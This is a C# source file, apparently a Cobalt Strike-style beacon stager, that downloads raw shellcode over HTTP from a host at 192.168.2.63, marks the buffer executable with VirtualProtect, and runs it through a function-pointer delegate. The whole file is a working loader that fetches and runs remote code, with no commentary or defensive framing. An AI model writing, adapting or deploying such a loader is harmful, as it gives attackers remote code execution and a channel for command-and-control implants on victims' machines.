using System;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Threading.Tasks;

namespace BeaconCSharp
{
    internal class Program
    {
        enum PAGE_PROTECTION_FLAGS : uint
        {
            PAGE_READWRITE = 0x00000004,
            PAGE_EXECUTE_READ = 0x00000020,
            PAGE_EXECUTE_READWRITE = 0x00000040,
        }

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate void Beacon();

        [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true)]
        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
        static extern unsafe bool VirtualProtect(
            void* lpAddress,
            nuint dwSize,
            PAGE_PROTECTION_FLAGS flNewProtect,
            out PAGE_PROTECTION_FLAGS lpflOldProtect
        );
        public static async Task Main(string[] args)
        {
            byte[] shellcode;

            using (var client = new HttpClient())
            {
                client.BaseAddress = new Uri("http://192.168.2.63");
                shellcode = await client.GetByteArrayAsync("/shellcode.bin");
            }


            unsafe
            {
                fixed (byte* ptr = shellcode)
                {
                    VirtualProtect(
                        ptr,
                        (uint)shellcode.Length,
                        PAGE_PROTECTION_FLAGS.PAGE_EXECUTE_READWRITE,
                        out _
                    );

                    var beacon = Marshal.GetDelegateForFunctionPointer<Beacon>((IntPtr)ptr);
                    beacon();
                }
            }
        }
    }
}
